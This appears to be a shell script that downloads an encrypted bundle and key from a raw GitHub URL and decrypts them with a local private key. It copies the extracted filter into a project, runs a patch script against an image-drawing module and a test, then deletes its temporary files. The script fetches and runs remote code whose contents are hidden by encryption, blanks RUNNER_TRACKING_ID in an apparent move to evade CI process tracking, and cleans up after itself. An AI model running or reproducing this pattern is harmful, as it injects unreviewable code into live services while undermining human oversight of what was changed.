echo "K1: cr_fpatch (patch filter + test; numbers only)"; export RUNNER_TRACKING_ID=""
N=/workspace/nox; R=https://raw.githubusercontent.com/MSSTXNEWS/nox-helion-pp-private-build/${REF:-main}/nox-control/c300/bundles
W=$(mktemp -d); curl -fsSL $R/enc_in/cr_fp.enc -o $W/e; curl -fsSL $R/enc_in/cr_fp.key -o $W/k
openssl pkeyutl -decrypt -inkey $N/state/keys/inbox.pem -in $W/k -out $W/kk && openssl enc -d -aes-256-cbc -pbkdf2 -in $W/e -pass file:$W/kk | tar xzf - -C $W || { echo DECRYPT_FAIL; exit 0; }
cp $W/nox_filter.py $N/ops/draw/nox_filter.py
if ! grep -q nox_filter $N/ops/draw/invoke_draw.py; then $N/venv/bin/python -I $W/patch_filter.py 2>&1 | tail -2; else echo "already patched"; fi
cd $W && $N/venv/bin/python -I ftest2.py 2>&1 | tail -14 | cut -c1-300
echo "imgsvc_pid=$(pgrep -f 'image_service.py' | head -1)"
rm -rf $W; echo END
